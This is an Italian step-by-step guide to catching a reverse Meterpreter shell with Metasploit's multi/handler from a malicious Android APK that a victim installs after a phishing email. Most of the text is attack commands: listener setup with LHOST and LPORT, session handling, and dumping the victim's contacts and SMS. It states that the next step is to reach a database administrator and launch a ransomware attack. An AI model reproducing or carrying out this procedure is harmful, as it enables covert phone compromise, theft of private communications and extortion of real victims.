# FASE 1 Aprire msfconsole

La sessione di Metasploit Framework funge da centro di comando unificato per gestire, orchestrare e tracciare le fasi operative del penetration test

Entriamo nella gestione del Listener
*msfconsole*
*use exploit/multi/handler*

# FASE 2 configurazione dell' Handler 

In questa fase attendiamo la connessione inversa generata dall'avvio dell'APK malevolo installato nel dispositivo android
*set PAYLOAD android/meterpreter/reverse_tcp*
*set LHOST 192.168.1.9*
(Deve corrispondere al payload)
*set LPORT 4447*
*set ExitOnSession false*      
(Mantiene il listener attivo anche se si connette)
*exploit -j* 

### verificare con *jobs -l* che il job sia attivo

### ATTENZIONE non si chiuda nessuna sessione ! Seguire con la mail di phishing

# FASE 3 La vittima ha eseguito ed aperto il file

Dopo che la vittima ha scaricato ed eseguito l'APK, possiamo navigare nel suo sistema per recepire informazioni sensibili

Verifichiamo che la connessione ci sia
*sessions -l*

poi entriamo nella sessione (in questo caso 1 perchè è l'unica)
*sessions -i 1*

# FASE 4 Una volta destro possiamo raccogliere dati sui contatti e molto altro

Procediamo con la raccolta dei contatti
*dump_contacts*
*dump_sms*

### siamo riusciti ad accedere ai contatti della vittima, da qui prenderemo il contatto del database administrator e procedere con l'attacco ransomware !

# FASE FINALE Chiudiamo la sessione

*session -k 1*
*exit* (usciamo da meterpreter)